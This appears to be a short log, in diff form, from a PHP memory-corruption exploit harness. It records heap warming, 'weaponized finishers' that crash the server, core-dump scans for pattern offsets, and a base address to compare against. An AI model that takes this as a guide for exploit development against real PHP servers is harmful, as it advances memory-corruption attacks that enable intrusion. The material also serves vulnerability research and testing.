@@ -1,0 +1,24 @@
+[0] restart -> ready
+    md5: ce1f3c48ba22f8f17834ac791aead613 (stock=ce1f3c48...)
+[1] core env + keep cores
+[2] warm patterned
+    warm done
+[3] sacrifice + 2 weaponized finishers
+  fire0: ERR b'<urlopen error [Errno 32] Broken pipe>'
+[fire0] core scan:
+c8d323dbc3ee9da0f2fe468250bb6eac  /tmp/core.70
+23604:AAAAAAzz
+136880160:AAAAAAzz
+136880176:AAAAAAzz
+2538
+  fire1: 200 b'<br />\n<b>Fatal error</b>:  Allowed memory size of'
+  fire2: ERR b'<urlopen error [Errno 32] Broken pipe>'
+[fire2] core scan:
+afa5c7cc4c3ef2e5e380c9a4b6ea4cb9  /tmp/core.70
+23604:AAAAAAzz
+136880160:AAAAAAzz
+136880176:AAAAAAzz
+2537
+[4] restore
+    restored: SAPI=apache2handler lim=8M vars=100000
+DONE: compare pattern offsets + md5 vs boot A (0x40209000 base, first hit @136,880,160)
